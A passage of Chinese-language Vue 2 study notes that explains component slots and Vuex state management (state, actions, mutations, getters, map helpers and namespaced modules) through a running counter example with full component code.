                <img alt="" src="../assets/logo.png" style='width: 100px'/>
            </a>
            <p class="card-text">{{user.name}}</p>
        </div>

        <!-- 展示欢迎词 -->
        <h1 v-show="info.isFirst">欢迎使用</h1>
        <!-- 展示正在搜索中 -->
        <h1 v-show="info.isLoading">加载中。。。</h1>
        <!-- 展示错误信息 -->
        <h1 v-show="info.errMsg">{{info.errMsg}}</h1>
    </div>
</template>

<script>
    // 引入 pubsub-js 消息订阅与发布
    import pubsub from 'pubsub-js'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: "List",
        data(){
            return {
                // ajax 请求返回的数据
                info: {
                    // 是否是初次展示
                    isFirst: true,
                    // 是否正在搜索中
                    isLoading: false,
                    // 错误信息
                    errMsg: '',
                    // 用户列表
                    userList: []
                }
            }
        },
        mounted() {
            // 挂载时接收数据；使用 pubsub-js 进行消息订阅；pubsub.subscribe("xxx", (消息名, 数据)=>{})；将其返回的 id 挂载到 this 上，以便进行取消订阅；
            this.punId = pubsub.subscribe("getUser", (msgName, response)=>{
                console.log(`接收到的消息名：${msgName}，数据：`, response);

                /**
                 * 因为传过来的 response 的参数不定，可多可少，所以使用这种写法
                 * 作用：response 里有的属性，赋值给 info，没有的属性，使用 info 中的属性赋值给 info
                 */
                this.info = {...this.info, ...response};
            })
        },
        beforeDestroy() {
            // 在 vc 实例销毁时解绑事件；使用 pubsub-js 取消订阅，使用使用 pubsub 的 id 进行取消
            pubsub.unsubscribe(this.punId);
        }
    }
</script>

<style scoped>
    .card {
        float: left;
        width: 33.333%;
        padding: .75rem;
        margin-bottom: 2rem;
        border: 1px solid #efefef;
        text-align: center;
    }

    .card > img {
        margin-bottom: .75rem;
        border-radius: 100px;
    }

    .card-text {
        font-size: 85%;
    }
</style>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-177--UckkZZ3EXBKGmw.png)

## 4、插槽

1.  作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 **父组件 ===> 子组件** 。 
2.  分类：默认插槽、具名插槽、作用域插槽 

### ①、默认插槽

- 使用方式

```vue
父组件中：
        <Category>
           <div>html结构1</div>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot>插槽默认内容...</slot>
            </div>
        </template>
```

---

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Category title="美食" :listData="foods" >
            <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
        </Category>

        <Category title="游戏" :listData="games" />

        <Category title="电影" :listData="films" >
            <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
        </Category>
    </div>
</template>

<script>
    // 引入组件
    import Category from './components/Category.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Category },
        data() {
            return {
                foods:['火锅','烧烤','小龙虾','牛排'],
                games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
                films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
            }
        },
    }
</script>

<style>
    /* css 样式 */
    .container{
        display: flex;
        justify-content: space-around;
    }
</style>
```

```vue
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <ul>
            <li v-for="(data) in listData" :key="data">{{data}}</li>
        </ul>

        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
        <slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: 'Category',
    props: ['title', 'listData']
}
</script>

<style scoped>
    .category {
        background-color: skyblue;
        width: 200px;
        height: 300px;
    }

    h3 {
        text-align: center;
        background-color: orange;
    }

    video {
        width: 100%;
    }

    img {
        width: 100%;
    }
</style>
```

### ②、具名插槽

- 使用方式

```vue
父组件中：
        <Category>
            <template slot="center">
              <div>html结构1</div>
            </template>

            <template v-slot:footer>
               <div>html结构2</div>
            </template>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot name="center">插槽默认内容...</slot>
               <slot name="footer">插槽默认内容...</slot>
            </div>
        </template>
```

---

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Category title="美食" :listData="foods" >
            <img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
            <a slot="footer" href="http://www.atguigu.com">更多美食</a>
        </Category>

        <Category title="游戏" :listData="games" />

        <Category title="电影" :listData="films" >
            <video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
            <!-- template 标签中可以使用 v-slot 属性 -->
            <template v-slot:footer>
                <div class="foot">
                    <a href="http://www.atguigu.com">经典</a>
                    <a href="http://www.atguigu.com">热门</a>
                    <a href="http://www.atguigu.com">推荐</a>
                </div>
                <h4>欢迎前来观影</h4>
            </template>
        </Category>
    </div>
</template>

<script>
    // 引入组件
    import Category from './components/Category.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Category },
        data() {
            return {
                foods:['火锅','烧烤','小龙虾','牛排'],
                games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
                films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
            }
        },
    }
</script>

<style>
    /* css 样式 */
    .container, .foot{
        display: flex;
        justify-content: space-around;
    }
    h4{
        text-align: center;
    }
    video {
        width: 100%;
    }

    img {
        width: 100%;
    }
</style>
```

```vue
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <ul>
            <li v-for="(data) in listData" :key="data">{{data}}</li>
        </ul>

        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
        <slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
        <slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
    </div>
</template>

<script>
    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Category',
        props: ['title', 'listData']
    }
</script>

<style scoped>
    .category {
        background-color: skyblue;
        width: 200px;
        height: 400px;
    }

    h3 {
        text-align: center;
        background-color: orange;
    }
</style>
```

### ③、作用域插槽

- 使用方式
- 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

```vue
父组件中：
		<Category>
			<template scope="scopeData">
				<!-- 生成的是ul列表 -->
				<ul>
					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category>
			<template slot-scope="scopeData">
				<!-- 生成的是h4标题 -->
				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
			</template>
		</Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
		
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                    }
                },
            }
        </script>
```

---

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Category title="美食" >
            <!-- scope 的值可以随便写 -->
            <template scope="aaa">
                <ul>
                    <li v-for="(game) in aaa.games" :key="game">{{game}}</li>
                </ul>
            </template>
        </Category>

        <Category title="游戏">
            <template scope="bbb">
                <ol style="color: chocolate">
                    <li v-for="(game) in bbb.games" :key="game">{{game}}</li>
                </ol>
            </template>
        </Category>

        <Category title="游戏">
            <template scope="bbb">
                <h2 v-for="(game) in bbb.games" :key="game">{{game}}</h2>
            </template>
        </Category>
    </div>
</template>

<script>
    // 引入组件
    import Category from './components/Category.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Category }
    }
</script>

<style>
    /* css 样式 */
    .container{
        display: flex;
        justify-content: space-around;
    }
    h4{
        text-align: center;
    }
    video {
        width: 100%;
    }

    img {
        width: 100%;
    }
</style>
```

```vue
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
        <slot :games="games">游戏</slot>
    </div>
</template>

<script>
    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Category',
        props: [ 'title' ],
        data() {
            return {
                foods:['火锅','烧烤','小龙虾','牛排'],
                games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
                films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
            }
        },
    }
</script>

<style scoped>
    .category {
        background-color: skyblue;
        width: 200px;
        height: 400px;
    }

    h3 {
        text-align: center;
        background-color: orange;
    }
</style>
```

# 六、集中式数据管理 vuex

## 1、vuex 是什么

1. 在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。
2. Github 地址：[https://github.com/vuejs/vuex](https://github.com/vuejs/vuex)

![](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2FPasted%20image%2020230725125437.png)

---

求和案例：纯 vue 版

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App)
}).$mount('#app')

```
```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Count />
    </div>
</template>

<script>
    // 引入组件
    import Count from './components/Count.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Count }
    }
</script>

<style>
    /* css 样式 */
</style>
```
```vue
<template>
    <div>
        <h1>当前求和为：{{sum}}</h1>
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="increment">+</button>
        <button @click="decrement">-</button>
        <button @click="incrementOdd">当前求和为奇数再加</button>
        <button @click="incrementWait">等一等再加</button>
    </div>
</template>

<script>
    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Count',
        data(){
            return {
                // 用户选择的数字
                num: 1,
                // 当前的和
                sum: 0
            }
        },
        methods: {
            increment(){
                this.sum = this.sum + this.num
            },
            decrement(){
                this.sum = this.sum - this.num
            },
            incrementOdd(){
                if ( this.sum%2 ){
                    this.sum = this.sum + this.num
                }
            },
            incrementWait(){
                setTimeout(()=>{
                    this.sum = this.sum + this.num
                },1000);
            },
        }
    }
</script>

<style>
    button{
        margin-left: 5px;
    }
</style>
```

## 2、什么时候使用 Vuex

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态

## 3、搭建 vuex 环境

1. 添加依赖：
   1. vue2：`npm i vuex@3`
   2. vue3：`npm i vuex@4`
2. 在 src 目录下创建 store 文件夹，在其中创建 index.js 文件；因为ES6 中 import 提升的原因，所以需要在此文件中引入 vue、vuex，以及应用 vuex 插件

```javascript
// 该文件用于创建 vuex 中最核心的 store

// 引入 Vue
import Vue from 'vue'
// 引入 Vuex
import Vuex from 'vuex'
// 应用 Vuex 插件
Vue.use(Vuex)

// 准备 actions：用于响应组件中的动作
const actions = {}
// 准备 mutations：用于操作数据（state）
const mutations = {}
// 准备 state：用于存储数据
const state = {}

// 创建并暴露 store
export default new Vuex.Store({
    actions,
    mutations,
    state,
})
```

3. 编辑 sce 目录下的 main.js 文件，引入 vuex

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 vuex 的 store
import store from './store'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用 vuex 的 store
    store,
}).$mount('#app')

```

## 4、使用 Vuex

1. 调用流程：
   1. 组件 -> `actions`，`this.$store.dispatch("函数名", 数据)`
   2. `actions `-> `mutations`，`context.commit("函数名", 数据)`
   3. `mutations `-> `state`，`state.sum = state.sum + value`，修改数据
   4. 组件 -> `state`，`{{$store.state.sum}}`，查看数据
2. 若是 `actions`中没有业务逻辑，也可直接在组件中调用 `mutation`，`this.$store.commit("函数名", 数据)`
3. actions 与 mutations 中都可以调用其他方法：

```javascript
// 准备 actions：用于响应组件中的动作
const actions = {
    jiaOdd(context, value){
        if ( context.state.sum % 2 ){
            context.commit("JIA", value)
        }
    },
    jiaWait(context, value){
        setTimeout(()=>{
            context.commit("JIA", value)
        },1000);
        // actions 与 mutations 中都可以调用其他方法
        context.dispatch("demo1", value)
    },

    // actions 与 mutations 中都可以调用其他方法
    demo1(context, value){
        context.dispatch("demo2", value)
    },
    demo2(context, value){
        console.log("demo2", value)
    },
}
```

---

求和案例：vuex 版

1. main.js 中引入 store

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 vuex 的 store
import store from './store'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用 vuex 的 store
    store,
}).$mount('#app')

```

2. 在 src 目录下创建 store 文件夹，在其中创建 index.js 文件；编写 `state` 数据、`actions` 业务函数、`mutations` 逻辑函数

```javascript
// 该文件用于创建 vuex 中最核心的 store

// 引入 Vue
import Vue from 'vue'
// 引入 Vuex
import Vuex from 'vuex'
// 应用 Vuex 插件
Vue.use(Vuex)

// 准备 actions：用于响应组件中的动作
const actions = {
    jiaOdd(context, value){
        if ( context.state.sum % 2 ){
            context.commit("JIA", value)
        }
    },
    jiaWait(context, value){
        setTimeout(()=>{
            context.commit("JIA", value)
        },1000);
    }
}
// 准备 mutations：用于操作数据（state）
const mutations = {
    JIA(state, value){
        state.sum = state.sum + value
    },
    JIAN(state, value){
        state.sum = state.sum - value
    }
}
// 准备 state：用于存储数据
const state = {
    // 当前的和
    sum: 0
}

// 创建并暴露 store
export default new Vuex.Store({
    actions,
    mutations,
    state,
})
```

3. APP 组件

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Count />
    </div>
</template>

<script>
    // 引入组件
    import Count from './components/Count.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Count }
    }
</script>

<style>
    /* css 样式 */
</style>
```

4. Count 组件

```vue
<template>
    <div>
        <h1>当前求和为：{{$store.state.sum}}</h1>
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="increment">+</button>
        <button @click="decrement">-</button>
        <button @click="incrementOdd">当前求和为奇数再加</button>
        <button @click="incrementWait">等一等再加</button>
    </div>
</template>

<script>
    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Count',
        data(){
            return {
                // 用户选择的数字
                num: 1
            }
        },
        methods: {
            increment(){
                this.$store.commit("JIA", this.num)
            },
            decrement(){
                this.$store.commit("JIAN", this.num)
            },
            incrementOdd(){
                this.$store.dispatch("jiaOdd", this.num)
            },
            incrementWait(){
                this.$store.dispatch("jiaWait", this.num)
            },
        }
    }
</script>

<style>
    button{
        margin-left: 5px;
    }
</style>
```

## 5、`state` 中的 `getters` 配置项

1.  概念：当 `state` 中的数据需要经过加工后再使用时，可以使用 `getters` 加工。 
2.  在`store.js`中追加`getters`配置 

```javascript
......

const getters = {
	bigSum(state){
		return state.sum * 10
	}
}

//创建并暴露store
export default new Vuex.Store({
	......
	getters
})
```

3.  组件中读取数据：`$store.getters.bigSum` 

---

求和案例：vuex 版；增加`getters` 配置项

1. main.js 中引入 store

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 vuex 的 store
import store from './store'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用 vuex 的 store
    store,
}).$mount('#app')

```

2. 在 src 目录下创建 store 文件夹，在其中创建 index.js 文件；编写 `state` 数据、`actions` 业务函数、`mutations` 逻辑函数；增加`getters` 配置项

```javascript
// 该文件用于创建 vuex 中最核心的 store

// 引入 Vue
import Vue from 'vue'
// 引入 Vuex
import Vuex from 'vuex'
// 应用 Vuex 插件
Vue.use(Vuex)

// 准备 actions：用于响应组件中的动作
const actions = {
    jiaOdd(context, value){
        if ( context.state.sum % 2 ){
            context.commit("JIA", value)
        }
    },
    jiaWait(context, value){
        setTimeout(()=>{
            context.commit("JIA", value)
        },1000);
        // actions 与 mutations 中都可以调用其他方法
        context.dispatch("demo1", value)
    },

    // actions 与 mutations 中都可以调用其他方法
    demo1(context, value){
        context.dispatch("demo2", value)
    },
    demo2(context, value){
        console.log("demo2", value)
    },
}
// 准备 mutations：用于操作数据（state）
const mutations = {
    JIA(state, value){
        state.sum = state.sum + value
    },
    JIAN(state, value){
        state.sum = state.sum - value
    }
}
// 准备 state：用于存储数据
const state = {
    // 当前的和
    sum: 2
}
// getters：用于对 state 中的数据进行加工
const getters = {
    // 数据增大十倍
    BigSUM(state){
        return state.sum * 10
    }
}

// 创建并暴露 store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

3. APP 组件

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Count />
    </div>
</template>

<script>
    // 引入组件
    import Count from './components/Count.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Count }
    }
</script>

<style>
    /* css 样式 */
</style>
```

4. Count 组件

```vue
<template>
    <div>
        <h1>当前求和为：{{$store.state.sum}}</h1>
        <BigSUM />
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="increment">+</button>
        <button @click="decrement">-</button>
        <button @click="incrementOdd">当前求和为奇数再加</button>
        <button @click="incrementWait">等一等再加</button>
    </div>
</template>

<script>
    // 引入组件
    import BigSUM from './BigSUM.vue'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Count',
        components: { BigSUM },
        data(){
            return {
                // 用户选择的数字
                num: 1
            }
        },
        methods: {
            increment(){
                this.$store.commit("JIA", this.num)
            },
            decrement(){
                this.$store.commit("JIAN", this.num)
            },
            incrementOdd(){
                this.$store.dispatch("jiaOdd", this.num)
            },
            incrementWait(){
                this.$store.dispatch("jiaWait", this.num)
            },
        }
    }
</script>

<style>
    button{
        margin-left: 5px;
    }
</style>
```

5. BigSUM 组件

```vue
<template>
    <h3>数据增大十倍后为：{{$store.getters.BigSUM}}</h3>
</template>

<script>
export default {
    name: "BigSUM"
}
</script>

```

## 6、四个 map 方法的使用

1.  `**mapState**`** 方法：**用于帮助我们映射`state`中的数据为计算属性 

```javascript
computed: {
    //借助mapState生成计算属性：sum、school、subject（对象写法）
     ...mapState({sum:'sum',school:'school',subject:'subject'}),
         
    //借助mapState生成计算属性：sum、school、subject（数组写法）
    ...mapState(['sum','school','subject']),
},
```

2.  `**mapGetters **`**方法：**用于帮助我们映射`getters`中的数据为计算属性 

```javascript
computed: {
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters({bigSum:'bigSum'}),

    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters(['bigSum'])
},
```

3. ` **mapActions**`** 方法：**用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数 

```javascript
methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait'])
}
```

4.  `**mapMutations**`** 方法：**用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数 

```javascript
methods:{
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
    
    //靠mapMutations生成：JIA、JIAN（对象形式）
    ...mapMutations(['JIA','JIAN']),
}
```

> 备注：`mapActions` 与 `mapMutations` 使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

---

求和案例：vuex 版；四个 map 方法的使用

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 vuex 的 store
import store from './store'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用 vuex 的 store
    store,
}).$mount('#app')

```

```javascript
// 该文件用于创建 vuex 中最核心的 store

// 引入 Vue
import Vue from 'vue'
// 引入 Vuex
import Vuex from 'vuex'
// 应用 Vuex 插件
Vue.use(Vuex)

// 准备 actions：用于响应组件中的动作
const actions = {
    jiaOdd(context, value){
        if ( context.state.sum % 2 ){
            context.commit("JIA", value)
        }
    },
    jiaWait(context, value){
        setTimeout(()=>{
            context.commit("JIA", value)
        },1000);
        // actions 与 mutations 中都可以调用其他方法
        context.dispatch("demo1", value)
    },

    // actions 与 mutations 中都可以调用其他方法
    demo1(context, value){
        context.dispatch("demo2", value)
    },
    demo2(context, value){
        console.log("demo2", value)
    },
}
// 准备 mutations：用于操作数据（state）
const mutations = {
    JIA(state, value){
        state.sum = state.sum + value
    },
    JIAN(state, value){
        state.sum = state.sum - value
    }
}
// 准备 state：用于存储数据
const state = {
    // 当前的和
    sum: 2,
    teacher: "月海",
    student: "言"
}
// getters：用于对 state 中的数据进行加工
const getters = {
    // 数据增大十倍
    BigSUM(state){
        return state.sum * 10
    }
}

// 创建并暴露 store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Count />
    </div>
</template>

<script>
    // 引入组件
    import Count from './components/Count.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Count }
    }
</script>

<style>
    /* css 样式 */
</style>
```
```vue
<template>
    <div>
        <h1>当前求和为：{{sum}}</h1>
        <BigSUM />
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="JIA(num)">+</button>
        <button @click="JIAN(num)">-</button>
        <button @click="jiaOdd(num)">当前求和为奇数再加</button>
        <button @click="jiaWait(num)">等一等再加</button>
    </div>
</template>

<script>
    // 引入组件
    import BigSUM from './BigSUM.vue'

    /**
     * 引入 vuex 中的四个 map 方法
     * mapState：帮助我们映射 state 中的数据为计算属性
     * mapGetters：帮助我们映射 getters 中的数据为计算属性
     * mapActions：帮助我们生成与 actions 对话的方法，即：包含 $store.dispatch(xxx) 的函数
     * mapMutations：帮助我们生成与 mutations 对话的方法，即：包含 $store.commit(xxx) 的函数
     */
    import { mapState, mapActions, mapMutations } from 'vuex'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Count',
        components: { BigSUM },
        data(){
            return {
                // 用户选择的数字
                num: 1
            }
        },
        methods: {
            // 借助 mapMutations 生成函数，从 mutations 中调用函数。方式一：对象写法，mutations 中属性名与组件中不同；组件中调用 increment、decrement
            // ...mapMutations({increment: "JIA", decrement: "JIAN"}),

            /**
             * 使用 mapActions、mapMutations 时，需要在调用函数时传递参数：@click="JIA(num)"
             */
            // 借助 mapMutations 生成函数，从 mutations 中调用函数。方式二：数组写法，mutations 中属性名与组件中相同
            ...mapMutations(["JIA", "JIAN"]),
            // 借助 mapActions 生成函数，从 actions 中调用函数。方式二：数组写法，actions 中属性名与组件中相同
            ...mapActions(["jiaOdd", "jiaWait"])
        },
        computed: {
            // 借助 mapState 生成计算属性，从 state 中读取数据。方式二：数组写法，state 中属性名与组件中相同
            ...mapState(["sum"])
        }
    }
</script>

<style>
    button{
        margin-left: 5px;
    }
</style>
```

```vue
<template>
    <div>
        <h3>数据增大十倍后为：{{BigSUM}}</h3>
        <p>老师：{{teacher}}</p>
        <p>学生：{{student}}</p>
    </div>
</template>

<script>
    /**
     * 引入 vuex 中的四个 map 方法
     * mapState：帮助我们映射 state 中的数据为计算属性
     * mapGetters：帮助我们映射 getters 中的数据为计算属性
     * mapActions：帮助我们生成与 actions 对话的方法，即：包含 $store.dispatch(xxx) 的函数
     * mapMutations：帮助我们生成与 mutations 对话的方法，即：包含 $store.commit(xxx) 的函数
     */
    import { mapState, mapGetters } from 'vuex'

    export default {
        name: "BigSUM",
        computed: {
            // 借助 mapState 生成计算属性，从 state 中读取数据。方式一：对象写法，state 中属性名与组件中不同；组件中调用 laoshi、xuesheng
            // ...mapState({laoshi: "teacher", xuesheng: "student"})

            // 借助 mapState 生成计算属性，从 state 中读取数据。方式二：数组写法，state 中属性名与组件中相同
            ...mapState(["teacher", "student"]),
            // 借助 mapGetters 生成计算属性，从 getters 中读取数据。方式二：数组写法，getters 中属性名与组件中相同
            ...mapGetters(["BigSUM"])
        }
    }
</script>

```

## 7、模块化 + 命名空间

- 目的：让代码更好维护，让多种数据分类更加明确。

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 vuex 的 store
import store from './store'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用 vuex 的 store
    store,
}).$mount('#app')

```

```javascript
// 该文件用于创建 vuex 中最核心的 store

// 引入 Vue
import Vue from 'vue'
// 引入 Vuex
import Vuex from 'vuex'
// 应用 Vuex 插件
Vue.use(Vuex)
// 引入分模块的 vuex 代码
import countOptions from './count'
import PersonOptions from './person'

// 创建并暴露 store
export default new Vuex.Store({
    modules: {
        countOptions,
        PersonOptions
    }
})
```

```javascript
// 求和相关配置
export default {
    // 开启命名空间（必须）
    namespaced: true,

    // 准备 actions：用于响应组件中的动作
    actions: {
        jiaOdd(context, value){
            if ( context.state.sum % 2 ){
                context.commit("JIA", value)
            }
        },
        jiaWait(context, value){
            setTimeout(()=>{
                context.commit("JIA", value)
            },1000);
            // actions 与 mutations 中都可以调用其他方法
            context.dispatch("demo1", value)
        },
    },

    // 准备 mutations：用于操作数据（state）
    mutations: {
        JIA(state, value){
            state.sum = state.sum + value
        },
        JIAN(state, value){
            state.sum = state.sum - value
        },
    },

    // 准备 state：用于存储数据
    state: {
        // 当前的和
        sum: 2,
        teacher: "月海",
        student: "言",
    },

    // getters：用于对 state 中的数据进行加工
    getters: {
        // 数据增大十倍
        BigSUM(state){
            return state.sum * 10
        }
    }
}
```

```javascript
// 人员管理相关配置
export default {
    // 开启命名空间（必须）
    namespaced: true,

    // 准备 actions：用于响应组件中的动作
    actions: {
        addPerson(context, value){
            let id = String(Number(context.state.personList[0].id) + 1);
            // 加 0
            while (id.length < 3){
                id = "0" + id;
            }

            context.commit("ADD_PERSON", {id: id, name: value})
        }
    },

    // 准备 mutations：用于操作数据（state）
    mutations: {
        ADD_PERSON(state, value){
            // unshift：向数组的开头添加一个或更多元素，并返回新的长度
            state.personList.unshift(value)
        }
    },

    // 准备 state：用于存储数据
    state: {
        personList: [
            {id: "002", name: "言"},
            {id: "001", name: "月海"}
        ]
    },

    // getters：用于对 state 中的数据进行加工
    getters: {}
}
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Count /><hr>
        <Person />
    </div>
</template>

<script>
    // 引入组件
    import Count from './components/Count.vue'
    import Person from './components/Person.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components:{ Count, Person }
    }
</script>

<style>
    /* css 样式 */
</style>
```
```vue
<template>
    <div>
        <h1>当前求和为：{{sum}}</h1>
        <BigSUM />
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="JIA(num)">+</button>
        <button @click="JIAN(num)">-</button>
        <button @click="jiaOdd(num)">当前求和为奇数再加</button>
        <button @click="jiaWait(num)">等一等再加</button>

        <h3>人员数量：{{personList.length}}</h3>
    </div>
</template>

<script>
    // 引入组件
    import BigSUM from './BigSUM.vue'

    // 引入 vuex 中的四个 map 方法
    import { mapState, mapActions, mapMutations } from 'vuex'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Count',
        components: { BigSUM },
        data(){
            return {
                // 用户选择的数字
                num: 1
            }
        },
        methods: {
